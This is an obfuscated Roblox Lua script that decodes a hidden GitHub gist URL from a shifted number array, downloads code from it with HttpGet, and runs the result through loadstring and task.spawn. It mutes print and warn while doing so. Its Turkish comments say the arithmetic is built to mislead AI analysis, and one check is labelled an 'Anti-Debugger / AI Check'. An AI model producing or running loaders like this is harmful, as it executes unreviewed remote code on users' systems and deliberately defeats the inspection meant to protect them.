local _1 = string; local _2 = table; local _3 = game;
local _4 = {116,128,128,124,127,70,59,59,115,117,127,128,58,115,117,128,116,129,110,129,127,113,126,111,123,122,128,113,122,128,58,111,123,121,59,67,95,109,130,117,128,109,126,59,63,65,109,66,113,112,109,113,114,68,114,62,114,66,69,67,62,114,62,114,62,63,68,68,65,111,110,111,63,61,62,113,59,126,109,131,59,110,61,69,110,109,110,112,113,60,60,109,69,63,60,62,63,64,112,65,61,112,111,111,62,113,114,112,111,63,62,61,114,67,113,112,112,113,61,69,65,59,82,96,77,92,57,95,77,98,85,96,77,94,57,84,97,78,57,78,81,96,77}

local function _X(_D)
    local _P = _3.PlaceId -- AI bunu bilmediği için sonucu yanlış hesaplar
    local _V = (_P % 10 > 5) and 2 or 1
    local _K = 12 + (_V * 0) -- Karmaşık görünen ama sabit sonuç veren işlemler
    local _R = {}
    for i = 1, #_D do
        local _char = _D[i] - _K
        _R[i] = _1.char(_char)
    end
    return _2.concat(_R)
end

local _M = {
    ["\104\116\116\112"] = function(obj, url) return obj:HttpGet(url, true) end,
    ["\108\115\116\114"] = loadstring
}

local function _S()
    local _p, _w = print, warn;
    print, warn = function() end, function() end;
    
    -- Anti-Debugger / AI Check
    if not _3:IsLoaded() then return end 

    local _u = _X(_4) .. "?v=" .. math.random(100, 999)
    local _success, _content = pcall(_M["\104\116\116\112"], _3, _u)
    
    print, warn = _p, _w;
    
    if _success and _content and #_content > 5 then
        local _f = _M["\108\115\116\114"](_content)
        if _f then 
            task.spawn(_f) 
        end
    end
end

_S()
